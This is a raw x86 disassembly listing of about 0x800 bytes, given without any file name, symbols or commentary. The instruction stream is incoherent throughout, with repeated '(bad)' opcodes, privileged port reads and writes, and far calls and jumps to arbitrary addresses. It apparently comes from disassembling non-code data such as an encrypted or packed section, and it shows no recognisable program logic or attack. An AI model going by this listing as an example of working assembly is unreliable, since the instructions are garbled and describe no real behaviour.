  40374c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40374d:	or     dh,ah
  40374f:	mov    esi,0x7f4be139
  403754:	ins    BYTE PTR es:[edi],dx
  403755:	outs   dx,BYTE PTR ds:[esi]
  403756:	loop   0x403706
  403758:	shl    DWORD PTR [eax+eiz*4-0x35],1
  40375c:	pop    ecx
  40375d:	sub    eax,0x1794fdfc
  403762:	cmp    eax,0xe6048eaf
  403767:	jmp    0x52fcd7f9
  40376c:	enter  0xd8dd,0xf1
  403770:	xlat   BYTE PTR ds:[ebx]
  403771:	ffreep st(6)
  403773:	mov    dl,BYTE PTR [ebp+0x76]
  403776:	les    ebx,FWORD PTR es:[edx+0x6e5fcc1b]
  40377d:	jae    0x40379f
  40377f:	sbb    ah,BYTE PTR [ebx]
  403781:	aam    0x6d
  403783:	mov    dl,0xd0
  403785:	daa    
  403786:	mov    WORD PTR [edx+0x10],es
  403789:	or     BYTE PTR [eax+0x44],dl
  40378c:	push   edx
  40378d:	fistp  DWORD PTR [ecx-0x72]
  403790:	xchg   edx,eax
  403791:	mov    ecx,0xf8791da4
  403796:	xor    eax,0xe7a00fd
  40379b:	or     eax,DWORD PTR [edx]
  40379d:	push   ebp
  40379e:	jmp    0x543d1627
  4037a3:	ror    BYTE PTR [ecx-0x539ead79],cl
  4037a9:	test   ecx,0x7969160
  4037af:	out    0x4,al
  4037b1:	xchg   ebx,eax
  4037b2:	fbstp  TBYTE PTR [eax+0x2feed666]
  4037b8:	out    dx,al
  4037b9:	jl     0x403773
  4037bb:	nop
  4037bc:	mov    ch,0x5
  4037be:	mov    al,ch
  4037c0:	(bad)
  4037c3:	in     eax,0xca
  4037c5:	call   0x5e4f319f
  4037ca:	ficom  DWORD PTR [esi]
  4037cc:	sbb    al,0x36
  4037ce:	xchg   DWORD PTR [esi-0x6cd80c79],eax
  4037d4:	push   esp
  4037d5:	add    eax,0xd21d00f7
  4037da:	cmp    al,0xa3
  4037dc:	dec    eax
  4037dd:	arpl   sp,bp
  4037df:	lock das 
  4037e1:	push   edx
  4037e3:	std    
  4037e4:	sti    
  4037e5:	fisttp DWORD PTR [ebp-0x15]
  4037e8:	test   BYTE PTR [esi-0x5e],ch
  4037eb:	data16 (bad) 
  4037ed:	loopne 0x403857
  4037ef:	jle    0x4037fb
  4037f1:	sbb    dh,al
  4037f3:	cdq    
  4037f4:	xchg   esi,eax
  4037f5:	shl    DWORD PTR [edx+0x2ceab61],1
  4037fb:	xor    eax,0xb998c478
  403800:	in     al,0x6f
  403802:	cmp    eax,0x531e66a
  403807:	out    0x7f,eax
  403809:	sbb    al,0x7f
  40380b:	cmp    eax,0xad186f78
  403810:	out    dx,al
  403811:	inc    esp
  403812:	out    0x54,al
  403814:	xchg   edx,eax
  403815:	cld    
  403816:	inc    esi
  403817:	pop    ebx
  403818:	sbb    al,0x7f
  40381a:	shl    ebp,0x57
  40381d:	fs inc esp
  40381f:	add    ah,BYTE PTR [eax+0x7f]
  403822:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  403824:	or     DWORD PTR [edi+0x2c5691e1],esi
  40382a:	bnd jns 0x40381f
  40382d:	add    eax,0x918c8dc7
  403832:	xlat   BYTE PTR ds:[ebx]
  403833:	inc    ecx
  403834:	ficom  WORD PTR ss:0x3d890fd0
  40383b:	cli    
  40383c:	xchg   ecx,eax
  40383d:	push   edx
  40383e:	or     DWORD PTR [ebp+0x49d2debc],esi
  403844:	nop
  403845:	(bad)  
  403846:	(bad)
  403849:	loop   0x4038b3
  40384b:	std    
  40384c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40384d:	cdq    
  40384e:	into   
  40384f:	jnp    0x4037e3
  403851:	jmp    0x4038d2
  403853:	jo     0x403876
  403855:	stc    
  403856:	int3   
  403857:	je     0x4038c6
  403859:	jb     0x4038a7
  40385b:	(bad)  
  40385c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40385d:	dec    edi
  40385e:	cmp    eax,DWORD PTR [edx+0x7b]
  403861:	cmc    
  403862:	mov    al,0x99
  403864:	loopne 0x40389b
  403866:	jecxz  0x403897
  403868:	mov    esp,0x202dabec
  40386d:	sahf   
  40386e:	xor    dl,BYTE PTR [ecx+eax*1]
  403871:	sahf   
  403872:	clc    
  403873:	scas   eax,DWORD PTR es:[edi]
  403874:	add    eax,esp
  403876:	in     al,dx
  403877:	push   edi
  403878:	mov    edx,0xe728f867
  40387d:	aad    0x54
  40387f:	ins    DWORD PTR es:[edi],dx
  403880:	repnz call 0x725e:0x2d3f1598
  403888:	popf   
  403889:	adc    cl,al
  40388b:	sub    eax,0xcfdea60b
  403890:	outs   dx,BYTE PTR ds:[esi]
  403891:	lods   al,BYTE PTR ds:[esi]
  403892:	enter  0x4cb1,0x41
  403896:	imul   esi,ecx,0x2
  403899:	scas   eax,DWORD PTR es:[edi]
  40389a:	ret    
  40389b:	cmp    al,BYTE PTR [edx]
  40389d:	test   DWORD PTR [eax+edi*4-0x89c40fa],0x16b50ae3
  4038a8:	sbb    eax,0x217b1de8
  4038ad:	jmp    0x40391a
  4038af:	cmp    BYTE PTR [esi+0x31280215],dh
  4038b5:	mov    eax,0x6b124080
  4038ba:	cmp    al,dh
  4038bc:	test   BYTE PTR [ebx-0x478a1164],al
  4038c2:	loopne 0x403892
  4038c4:	int3   
  4038c5:	cmc    
  4038c6:	sbb    cl,0xf7
  4038c9:	pop    ss
  4038ca:	jmp    0x57e0:0xd23aea77
  4038d1:	mov    cl,0x43
  4038d3:	out    0x1f,al
  4038d5:	mov    ds:0x30870bb1,al
  4038da:	push   ds
  4038db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038dc:	sahf   
  4038dd:	pop    ebp
  4038de:	push   ebx
  4038df:	loop   0x4038e8
  4038e1:	pop    es
  4038e2:	add    ebx,edx
  4038e4:	and    BYTE PTR [ebp+0x18c58027],ch
  4038ea:	or     dl,BYTE PTR [eax+0x3d]
  4038ed:	sub    esp,ecx
  4038ef:	sahf   
  4038f0:	test   DWORD PTR [edx+0x13],esi
  4038f3:	popfw  
  4038f5:	fwait
  4038f6:	mov    esp,0xdb6ff3c7
  4038fb:	pop    eax
  4038fc:	shl    bh,1
  4038fe:	das    
  4038ff:	hlt    
  403900:	pslld  mm5,QWORD PTR [esp+ebx*2+0x6c7b0265]
  403908:	das    
  403909:	(bad)  
  40390a:	call   FWORD PTR [ebx+0x34]
  40390d:	xchg   BYTE PTR [eax],dh
  40390f:	sub    edx,DWORD PTR [ecx]
  403911:	mov    dl,0xc2
  403913:	xchg   ebx,eax
  403914:	(bad)  [eax-0x1cce6548]
  40391a:	xchg   esi,eax
  40391b:	add    ecx,DWORD PTR [edi]
  40391d:	call   DWORD PTR [eax-0x8]
  403920:	push   ds
  403921:	pop    edx
  403922:	test   BYTE PTR [ebx-0x53],cl
  403925:	repz inc edi
  403927:	push   esp
  403928:	psrlw  mm4,QWORD PTR [eax-0x4b]
  40392c:	jmp    0x7d9ac45a
  403931:	gs push 0xe
  403934:	xor    al,0x97
  403936:	add    BYTE PTR [ebp-0x41],dh
  403939:	sar    BYTE PTR [ebx],0xf6
  40393c:	(bad)  
  40393d:	aad    0x45
  40393f:	mov    edi,0x84e88c93
  403944:	je     0x4038d4
  403946:	mov    cl,0x93
  403948:	hlt    
  403949:	add    DWORD PTR [edx],esp
  40394b:	addr16 in eax,0x80
  40394e:	aaa    
  40394f:	aaa    
  403950:	cld    
  403951:	fcom   QWORD PTR [edx]
  403953:	std    
  403954:	add    eax,DWORD PTR [esi+0x75]
  403957:	xchg   DWORD PTR [ebp+0x78],ecx
  40395a:	dec    esp
  40395b:	jno    0x403990
  40395d:	(bad)  
  40395e:	push   esi
  40395f:	jne    0x40398f
  403961:	pop    es
  403962:	push   0xfc38ea9b
  403967:	pop    ebx
  403968:	stos   BYTE PTR es:[edi],al
  403969:	(bad)  
  40396a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40396b:	test   al,0x31
  40396d:	pop    esi
  40396e:	and    DWORD PTR [ebp+0x7c],esi
  403971:	test   BYTE PTR [ebp+0x277e5349],al
  403977:	sbb    eax,0xda9d9c69
  40397c:	out    dx,al
  40397d:	cmp    al,0xf4
  40397f:	shl    edi,cl
  403981:	call   0xbd2f:0xa8250c32
  403988:	mov    cl,0x5b
  40398a:	es stc 
  40398c:	xor    ebx,ebp
  40398e:	sbb    al,0xee
  403990:	adc    DWORD PTR [ecx+ebp*2],esi
  403993:	mov    esi,0xa2434822
  403998:	stos   DWORD PTR es:[edi],eax
  403999:	mov    ds:0xc289ee17,eax
  40399e:	jo     0x4039c1
  4039a0:	add    edi,esi
  4039a2:	rcl    BYTE PTR [ecx-0x549d9785],cl
  4039a8:	lods   al,BYTE PTR ds:[esi]
  4039a9:	xchg   esp,eax
  4039aa:	cs cld 
  4039ac:	cli    
  4039ad:	clc    
  4039ae:	sti    
  4039af:	sub    ebp,ecx
  4039b1:	retf   0xda7d
  4039b4:	pushf  
  4039b5:	mov    dl,0x5d
  4039b7:	push   edi
  4039b8:	shr    DWORD PTR [edi-0xda9f7df],0xf4
  4039bf:	call   0x53df:0xc5149017
  4039c6:	ja     0x403a22
  4039c8:	and    BYTE PTR [edi-0x49],cl
  4039cb:	mov    dl,0x75
  4039cd:	add    al,BYTE PTR ds:[ebx-0x70]
  4039d1:	lods   al,BYTE PTR ds:[esi]
  4039d2:	test   dh,cl
  4039d4:	inc    ebp
  4039d5:	repnz shr DWORD PTR [edi],0xb8
  4039d9:	test   dh,ch
  4039db:	mov    eax,0xe9ef8f4a
  4039e0:	test   al,0x9c
  4039e2:	inc    edx
  4039e3:	and    DWORD PTR fs:[ecx+eiz*8-0x25],edi
  4039e8:	or     BYTE PTR [edi],cl
  4039ea:	cmp    al,0x9d
  4039ec:	inc    ecx
  4039ed:	inc    eax
  4039ef:	jmp    0x403a5a
  4039f1:	pop    ds
  4039f2:	(bad)  
  4039f3:	xor    cl,cl
  4039f5:	jmp    0xb625e5cb
  4039fa:	sbb    ebx,DWORD PTR [ecx-0x7e6c87f2]
  403a00:	mov    eax,ds:0x4c4c1cd3
  403a05:	sub    bl,bh
  403a07:	fdiv   DWORD PTR [edi+0x35e51e20]
  403a0d:	out    dx,eax
  403a0e:	ret    
  403a0f:	mov    ecx,0x52f91204
  403a14:	fdivr  st,st(1)
  403a16:	sub    eax,0xd595091e
  403a1b:	cdq    
  403a1c:	xchg   edi,eax
  403a1d:	mov    BYTE PTR [ebx-0x16],dh
  403a20:	test   esp,ecx
  403a22:	frstor es:[edx-0x7f]
  403a26:	jmp    0x403aa0
  403a28:	xor    al,0xc1
  403a2a:	std    
  403a2b:	inc    eax
  403a2c:	fisubr WORD PTR [edx]
  403a2e:	in     al,dx
  403a2f:	scas   al,BYTE PTR es:[edi]
  403a30:	xchg   BYTE PTR [ecx-0x630f1028],ch
  403a36:	cmc    
  403a37:	xor    dh,dh
  403a39:	cmp    al,0xa3
  403a3b:	push   ebp
  403a3c:	(bad)
  403a41:	in     eax,0x4
  403a43:	xchg   ecx,eax
  403a44:	pop    esi
  403a45:	pop    ds
  403a46:	sbb    DWORD PTR [ebp+0x1aca352c],esi
  403a4c:	mov    eax,ds:0xf2f45188
  403a51:	xchg   BYTE PTR [eax-0x30c0e104],dh
  403a57:	ja     0x403a69
  403a59:	addr16 popa 
  403a5b:	push   edx
  403a5c:	cmp    eax,0x456dc215
  403a61:	icebp  
  403a62:	aaa    
  403a63:	inc    eax
  403a64:	sbb    eax,0x53b1948f
  403a69:	addr16 mov ds:0x8227,al
  403a6d:	fist   WORD PTR [edi+0x448f34d9]
  403a73:	scas   eax,DWORD PTR es:[edi]
  403a74:	xchg   esi,eax
  403a75:	push   ecx
  403a76:	clc    
  403a77:	xchg   esi,ebp
  403a79:	xchg   ecx,eax
  403a7a:	rcr    BYTE PTR ds:0x67e3f7ba,1
  403a80:	pop    ebx
  403a81:	inc    ebp
  403a82:	jno    0x403aa5
  403a84:	or     dh,BYTE PTR [ebp+0x5e6cdb79]
  403a8a:	or     dl,BYTE PTR [ebp+0x63e15510]
  403a90:	cmc    
  403a91:	fwait
  403a92:	inc    ebp
  403a93:	icebp  
  403a94:	jp     0x403ae0
  403a96:	cmp    BYTE PTR [esi-0x78171a20],ah
  403a9c:	jecxz  0x403a22
  403a9e:	and    eax,0xa56dba73
  403aa3:	cmc    
  403aa4:	mov    ebx,0x3c52c23f
  403aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aaa:	in     eax,0x2f
  403aac:	jbe    0x403b0e
  403aae:	jo     0x403a5d
  403ab0:	mov    edi,0xecbc81d
  403ab5:	pop    ds
  403ab6:	mov    ds:0x62d24747,eax
  403abb:	imul   edx,DWORD PTR [esi],0x736edda2
  403ac1:	mov    al,ds:0xfa0faaa0
  403ac6:	iret   
  403ac7:	jne    0x403b2b
  403ac9:	push   ss
  403aca:	dec    esi
  403acb:	jo     0x403b2a
  403acd:	push   0x4ed2733e
  403ad2:	jae    0x403a98
  403ad4:	repz push es
  403ad6:	mov    bh,0x9f
  403ad9:	mov    cl,0xd4
  403adb:	push   ds
  403adc:	in     al,dx
  403add:	xor    DWORD PTR [edi-0x66],0x3d10a6b9
  403ae4:	clc    
  403ae5:	mov    edi,0xe0c487e8
  403aea:	adc    al,al
  403aec:	xor    dh,BYTE PTR [ebx-0x2b1010db]
  403af2:	in     eax,0x2a
  403af4:	daa    
  403af5:	xor    ecx,DWORD PTR ds:0xedd
  403afa:	retf   0xe327
  403afd:	cmp    al,0xa8
  403aff:	adc    BYTE PTR [ebp+0xa],dl
  403b02:	sub    BYTE PTR [ecx],dh
  403b04:	sbb    BYTE PTR [edx+0x363d696],ah
  403b0a:	inc    esp
  403b0b:	aad    0xdf
  403b0d:	xor    ah,cl
  403b0f:	cmp    DWORD PTR [ebp+0x2f],esi
  403b12:	out    0xeb,eax
  403b14:	pop    es
  403b15:	cld    
  403b16:	jne    0x403b84
  403b18:	adc    ah,bh
  403b1a:	aas    
  403b1b:	mov    al,0xae
  403b1d:	in     eax,dx
  403b1e:	jecxz  0x403ab3
  403b20:	add    ebx,DWORD PTR [edi+0x77bfccb1]
  403b26:	fcomp  QWORD PTR [ebp-0xfc2c2bf]
  403b2c:	clc    
  403b2d:	lock mov ebp,0xa625b36
  403b33:	out    dx,al
  403b34:	lds    edx,FWORD PTR [ebx+eax*8-0x4b5a3fc3]
  403b3b:	outs   dx,BYTE PTR ds:[esi]
  403b3c:	pop    edx
  403b3d:	lock fimul WORD PTR [edi+ecx*1+0x306b135a]
  403b45:	sbb    esp,esi
  403b47:	cli    
  403b48:	cmp    bh,BYTE PTR ds:0x637f8e3
  403b4e:	inc    esp
  403b4f:	dec    eax
  403b50:	adc    eax,0xe568a4bc
  403b55:	pop    edi
  403b56:	icebp  
  403b57:	xchg   edi,eax
  403b58:	add    eax,0x58d33846
  403b5d:	icebp  
  403b5e:	das    
  403b5f:	or     edi,ebx
  403b61:	fdivp  st(1),st
  403b63:	inc    ebp
  403b64:	fcmovnu st,st(1)
  403b66:	jge    0x403b38
  403b68:	imul   BYTE PTR [edx]
  403b6a:	mov    fs,ecx
  403b6c:	or     bh,BYTE PTR [eax+0x6d21bed4]
  403b72:	call   0x3382c04c
  403b77:	retf   0xb576
  403b7a:	sub    DWORD PTR [esi-0x4],ecx
  403b7d:	jo     0x403b42
  403b7f:	xor    eax,0xc303bdfd
  403b84:	test   eax,0x89c0ab6d
  403b89:	lods   eax,DWORD PTR ds:[esi]
  403b8a:	iret   
  403b8b:	pop    DWORD PTR [ecx]
  403b8d:	sub    ch,BYTE PTR [edi+0x1e]
  403b90:	xchg   ebx,eax
  403b91:	lea    edx,[ecx+ebp*8]
  403b94:	(bad)  
  403b95:	cmc    
  403b96:	push   ds
  403b97:	cmp    eax,0x298e66f2
  403b9c:	aaa    
  403b9d:	adc    edx,DWORD PTR [ebx]
  403b9f:	and    eax,0xf6692749
  403ba4:	nop
  403ba5:	sbb    BYTE PTR [esp+eiz*4],dl
  403ba8:	arpl   WORD PTR [edi+0x2b],ax
  403bab:	ja     0x403bec
  403bad:	xchg   esp,eax
  403bae:	loop   0x403b5f
  403bb0:	adc    ebp,DWORD PTR [ecx+0x74]
  403bb3:	(bad)  
  403bb4:	jae    0x403c02
  403bb6:	push   0xa19d87b9
  403bbb:	(bad)  
  403bbc:	repz push ecx
  403bbe:	cs jmp 0xc737c8df
  403bc4:	lock ficom WORD PTR [ebx-0x1200ce44]
  403bcb:	xchg   edx,eax
  403bcc:	add    ebp,DWORD PTR [ecx+0x7a]
  403bcf:	xchg   esi,eax
  403bd0:	imul   esp,DWORD PTR [eax+0x76dcb213],0xffffffa9
  403bd7:	pop    ebp
  403bd8:	mov    al,0x9c
  403bda:	mov    al,ds:0x573f62dd
  403bdf:	add    bl,ah
  403be1:	and    bl,BYTE PTR [ebx-0x5cc5727d]
  403be7:	arpl   WORD PTR [edx+edi*1+0x1a169b9],ax
  403bee:	and    dl,BYTE PTR [edi+0x49]
  403bf1:	and    BYTE PTR [esi-0x6e],0x82
  403bf5:	rcr    DWORD PTR [ecx+0x37],0x71
  403bf9:	sub    ah,ch
  403bfb:	inc    ebp
  403bfc:	ins    BYTE PTR es:[edi],dx
  403bfd:	dec    ebp
  403bfe:	xchg   BYTE PTR [ebp+edi*1-0x11f14f39],bl
  403c05:	sbb    eax,0x92e7f27f
  403c0a:	lea    esp,[ecx-0x56538bff]
  403c10:	cld    
  403c11:	test   al,0x22
  403c13:	rol    BYTE PTR [ebx],cl
  403c15:	into   
  403c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c17:	in     al,dx
  403c18:	in     eax,dx
  403c19:	ss hlt 
  403c1b:	pushf  
  403c1c:	and    eax,0x4c98a9f3
  403c21:	loop   0x403bc5
  403c23:	repz push es
  403c25:	scas   al,BYTE PTR es:[edi]
  403c26:	arpl   WORD PTR [esi+0x40],bx
  403c29:	je     0x403c53
  403c2b:	or     cl,ch
  403c2d:	xchg   esi,eax
  403c2e:	dec    edi
  403c2f:	dec    esp
  403c30:	or     al,0x8
  403c32:	jae    0x403c4d
  403c34:	mov    edi,0x6795b187
  403c39:	cmp    bh,BYTE PTR [ecx+0x60]
  403c3c:	dec    edi
  403c3d:	pusha  
  403c3e:	sub    BYTE PTR [eax],bh
  403c40:	push   0x232de564
  403c45:	jo     0x403ca4
  403c47:	or     eax,0xdd3bc914
  403c4c:	or     esp,esp
  403c4e:	and    al,0x78
  403c50:	xchg   ecx,eax
  403c51:	push   eax
  403c52:	xchg   esp,eax
  403c53:	adc    al,0x47
  403c55:	sar    DWORD PTR [ecx],1
  403c57:	je     0x403be1
  403c59:	push   ecx
  403c5a:	and    DWORD PTR [ecx+0x16a89b1f],esp
  403c60:	mov    cl,0x6c
  403c62:	add    eax,0x69f4fd7b
  403c67:	cwde   
  403c68:	sub    DWORD PTR [esi+0x407dc97],ebp
  403c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c6f:	mov    BYTE PTR ds:0x4c618fa3,ch
  403c75:	aas    
  403c76:	aad    0x4f
  403c78:	sbb    ecx,DWORD PTR [eax]
  403c7a:	xchg   edi,eax
  403c7b:	cli    
  403c7c:	push   edi
  403c7d:	es jmp 0xf9f6:0xc7dfcf09
  403c85:	dec    esi
  403c86:	retf   0x9b5d
  403c89:	xor    ebp,DWORD PTR [ebx+0x54]
  403c8c:	xchg   DWORD PTR [eax+edi*4-0x5a2923db],edx
  403c93:	add    BYTE PTR [ebx-0x6d51e63f],ah
  403c99:	mov    ebp,0xba9cd2f8
  403c9e:	sbb    BYTE PTR [eax],ah
  403ca0:	sub    eax,0x1989ef9a
  403ca5:	(bad)  
  403ca6:	xchg   BYTE PTR [eax],dh
  403ca8:	push   esi
  403ca9:	cld    
  403caa:	pop    esp
  403cab:	jo     0x403c66
  403cad:	not    DWORD PTR [edi-0x763029f7]
  403cb3:	mov    DWORD PTR [ebx],ecx
  403cb5:	lds    esp,FWORD PTR [edx-0x4d]
  403cb8:	retf   
  403cb9:	ror    DWORD PTR [ebp+0x33],cl
  403cbc:	sbb    dh,BYTE PTR es:[eax+0x5b]
  403cc0:	addr16 adc eax,0xbfcf64a2
  403cc6:	add    al,0x31
  403cc8:	jp     0x403cac
  403cca:	out    dx,eax
  403ccb:	mov    DWORD PTR [ecx],0xc2d2ba1a
  403cd1:	sub    DWORD PTR ds:0xbf4fb80a,edx
  403cd7:	call   0x49b5:0x1d86f486
  403cde:	rol    DWORD PTR [eax-0x20a9cb6d],cl
  403ce4:	push   ecx
  403ce5:	sti    
  403ce6:	mov    eax,0xa1264f3
  403ceb:	jae    0x403cfb
  403ced:	jb     0x403c78
  403cef:	and    BYTE PTR [eax+0x127b6e1a],cl
  403cf5:	mov    ch,0x92
  403cf7:	xor    BYTE PTR [eax],0xa0
  403cfa:	jmp    DWORD PTR [ebx]
  403cfc:	push   es
  403cfd:	add    ebp,DWORD PTR ds:0x476b76d4
  403d03:	push   esi
  403d04:	adc    al,0x3f
  403d06:	into   
  403d07:	rcl    DWORD PTR [edi+0x3197edd9],1
  403d0d:	xchg   esp,eax
  403d0e:	push   ebp
  403d0f:	iret   
  403d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d11:	xor    al,0xbf
  403d13:	pop    ebp
  403d14:	inc    ebp
  403d15:	mov    ch,0x14
  403d17:	dec    ebx
  403d18:	popf   
  403d19:	pop    edx
  403d1a:	in     eax,0x7c
  403d1c:	push   eax
  403d1d:	sub    ecx,eax
  403d1f:	stc    
  403d20:	jmp    0x181b:0x142af600
  403d27:	aas    
  403d28:	mov    ch,0xb0
  403d2a:	mov    eax,0x8d69d0a
  403d2f:	(bad)  
  403d30:	pop    edx
  403d31:	mov    dh,BYTE PTR [ecx]
  403d33:	out    dx,al
  403d34:	and    ecx,ecx
  403d36:	sbb    dh,BYTE PTR [ecx+0x57be602]
  403d3c:	iret   
  403d3d:	ja     0x403d67
  403d3f:	enter  0xf9c3,0x3e
  403d43:	outs   dx,BYTE PTR ds:[esi]
  403d44:	call   0x4740:0x27fa8805
  403d4b:	mov    eax,0x1694d43
  403d50:	repz xor al,0x9b
  403d53:	mov    cl,0x76
  403d55:	jnp    0x403d78
  403d57:	mov    al,ds:0xca707b30
  403d5c:	or     DWORD PTR [esp+ebp*1+0x7d],ebp
  403d60:	jns    0x403d15
  403d62:	sbb    eax,DWORD PTR [eax-0x1a4be085]
  403d68:	sbb    esi,eax
  403d6a:	inc    esp
  403d6b:	jl     0x403d9c
  403d6d:	out    dx,al
  403d6e:	sbb    bl,BYTE PTR [esi]
  403d70:	outs   dx,DWORD PTR ds:[esi]
  403d71:	xchg   ebx,eax
  403d72:	mov    cl,0x9d
  403d74:	adc    BYTE PTR [ebx],bl
  403d76:	fs add ebx,ecx
  403d79:	push   es
  403d7a:	push   es
  403d7b:	push   0x6844e2c4
  403d80:	mov    bl,dl
  403d82:	(bad)  
  403d83:	out    dx,eax
  403d84:	push   ecx
  403d85:	(bad)  
  403d86:	xor    DWORD PTR [ecx-0x18],edx
  403d89:	ins    DWORD PTR es:[edi],dx
  403d8a:	mov    edx,0x13602e3b
  403d8f:	mov    eax,0xfe60356b
  403d94:	outs   dx,BYTE PTR ds:[esi]
  403d95:	iret   
  403d96:	push   esp
  403d97:	push   ecx
  403d98:	in     eax,dx
  403d99:	sar    BYTE PTR [ecx],cl
  403d9b:	int    0xcc
  403d9d:	mov    dl,0x3c
  403d9f:	cmc    
  403da0:	dec    edx
  403da1:	cmp    esi,DWORD PTR [edx+0x6a]
  403da4:	sar    al,cl
  403da6:	out    0xb3,al
  403da8:	leave  
  403da9:	rol    DWORD PTR [ebx-0x1e],cl
  403dac:	stc    
  403dad:	jo     0x403daa
  403daf:	pushf  
  403db0:	push   es
  403db1:	stos   DWORD PTR es:[edi],eax
  403db2:	cmp    al,0x83
  403db4:	jge    0x403d43
  403db6:	xor    dl,dh
  403db8:	xchg   DWORD PTR [edi+0x1d],ebp
  403dbb:	fistp  QWORD PTR [esi-0x17335bf5]
  403dc1:	(bad)  
  403dc3:	or     DWORD PTR [edi+0x6e16ce8],ecx
  403dc9:	jbe    0x403d80
  403dcb:	inc    ebp
  403dcc:	jb     0x403e12
  403dce:	ins    DWORD PTR es:[edi],dx
  403dcf:	sbb    BYTE PTR [ecx-0x57ec6674],0xd5
  403dd6:	inc    ebx
  403dd7:	adc    bl,BYTE PTR [edx-0x6a]
  403dda:	out    dx,al
  403ddb:	rol    DWORD PTR [ecx],cl
  403ddd:	xor    dh,BYTE PTR [edi+0x4710ecb1]
  403de3:	mov    dl,0x42
  403de5:	mov    ds:0x534b07ca,al
  403dea:	mov    ecx,0x9aa60273
  403def:	or     DWORD PTR [eax+0x39796dbd],0x373cbe62
  403df9:	jecxz  0x403dc7
  403dfb:	adc    eax,0x75dc16e4
  403e00:	in     al,dx
  403e01:	sti    
  403e02:	arpl   WORD PTR [ebx-0x2],bx
  403e05:	iret   
  403e06:	test   eax,0xe3b84c40
  403e0b:	push   ss
  403e0c:	sahf   
  403e0d:	add    BYTE PTR [ecx+edx*4],bl
  403e10:	cdq    
  403e11:	ja     0x403d96
  403e13:	repnz test DWORD PTR [ecx+0x78],ebx
  403e17:	inc    ebp
  403e18:	jp     0x403e83
  403e1a:	jmp    0xf259455e
  403e1f:	fild   QWORD PTR [ebp+ebx*4-0x6025ac04]
  403e26:	mov    al,0x70
  403e28:	stc    
  403e29:	int3   
  403e2a:	lods   eax,DWORD PTR ds:[esi]
  403e2b:	pop    ebx
  403e2c:	pushf  
  403e2d:	mov    esp,0x6b0f9e08
  403e32:	das    
  403e33:	xchg   edi,eax
  403e34:	je     0x403e05
  403e36:	ret    0x798
  403e39:	aad    0xcf
  403e3b:	add    BYTE PTR [eax+0x5c884480],dh
  403e41:	dec    ebp
  403e42:	call   0x769e7185
  403e47:	cld    
  403e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e49:	mov    edi,0xc6565597
  403e4e:	(bad)  
  403e4f:	(bad)  
  403e50:	cmp    ebx,DWORD PTR [ebp-0x7dfb23ef]
  403e56:	cli    
  403e57:	jg     0x403e51
  403e59:	jp     0x403e5f
  403e5b:	or     BYTE PTR [ebx+0x42],ch
  403e5e:	xlat   BYTE PTR ds:[ebx]
  403e5f:	push   ebp
  403e60:	sub    al,BYTE PTR [esi-0x11]
  403e63:	std    
  403e64:	(bad)  
  403e65:	addr16 and bh,bl
  403e68:	lahf   
  403e69:	pop    edx
  403e6a:	dec    ebx
  403e6b:	dec    eax
  403e6c:	in     eax,0x75
  403e6e:	mov    al,0x81
  403e70:	sbb    dl,0x6c
  403e73:	mov    al,ds:0xc8279870
  403e78:	rcl    ah,cl
  403e7a:	mov    ebp,DWORD PTR [edi+0x2491d5a3]
  403e80:	push   esp
  403e81:	xor    DWORD PTR [esi],edi
  403e83:	ins    DWORD PTR es:[edi],dx
  403e84:	dec    edx
  403e85:	sub    BYTE PTR [ebp+0x65],ch
  403e88:	fs cmp al,0xb8
  403e8b:	sbb    eax,0x67aa2355
  403e90:	pop    edx
  403e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e92:	scas   eax,DWORD PTR es:[edi]
  403e93:	retf   
  403e94:	mov    ds:0x1759e3eb,eax
  403e99:	push   eax
  403e9a:	ss out 0x8d,eax
  403e9d:	test   al,0x5d
  403e9f:	(bad)  
  403ea0:	(bad)  
  403ea1:	push   ss
  403ea2:	imul   ebx,ebp,0xa6a69ccf
  403ea8:	or     DWORD PTR [edi+0x6c1b3a06],edx
  403eae:	push   esp
  403eaf:	imul   edx,DWORD PTR [ebp+0x49ee58fb],0x19f83ae1
  403eb9:	ja     0x403e99
  403ebb:	rcl    ah,0x3
  403ebe:	popa   
  403ebf:	mov    bl,0xdd
  403ec1:	call   0x89105858
  403ec6:	idiv   DWORD PTR [edx+0x3203651c]
  403ecc:	cs push 0xa
  403ecf:	xchg   esi,eax
  403ed0:	(bad)  
  403ed1:	mov    ecx,0x17d0b587
  403ed6:	popf   
  403ed7:	push   ecx
  403ed8:	clc    
  403ed9:	retf   0xbbc7
  403edc:	xor    BYTE PTR [eax-0x709c3cff],dh
  403ee2:	mov    edi,0x79b94db6
  403ee7:	push   0xffffffff
  403ee9:	push   esp
  403eea:	cmp    al,0xda
  403eec:	and    DWORD PTR [esp+ecx*2-0x229b4286],0x49
  403ef4:	pop    ds
  403ef5:	frstor [edi]
  403ef7:	or     ecx,edi
  403ef9:	and    edi,ebp
  403efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403efc:	outs   dx,BYTE PTR ds:[esi]
  403efd:	inc    eax
  403efe:	loopne 0x403ee2
  403f00:	setge  BYTE PTR [eax+0x381216cb]
  403f07:	mov    ds:0xf367b99e,eax
  403f0c:	stc    
  403f0d:	jecxz  0x403e8f
  403f0f:	rol    BYTE PTR [eax-0x570dc0f9],1
  403f15:	adc    eax,0x1c0a7f36
  403f1a:	cli    
  403f1b:	(bad)
  403f1f:	imul   edx,DWORD PTR [edx],0xffffffff
  403f22:	inc    edi
  403f23:	and    al,BYTE PTR [edi+esi*2]
  403f26:	cmp    ebx,edx
  403f28:	xchg   ecx,eax
  403f29:	int    0xb5
  403f2b:	out    dx,al
  403f2c:	cmp    bh,BYTE PTR [edx-0x52]
  403f2f:	push   cs
  403f30:	mov    esp,0x3ebd12b6
  403f35:	inc    ebx
  403f36:	shl    DWORD PTR [ebx+edx*4],1
  403f39:	das    
  403f3a:	retf   
  403f3b:	js     0x403ed7
  403f3d:	and    eax,0x607ca270
  403f42:	aad    0xdb
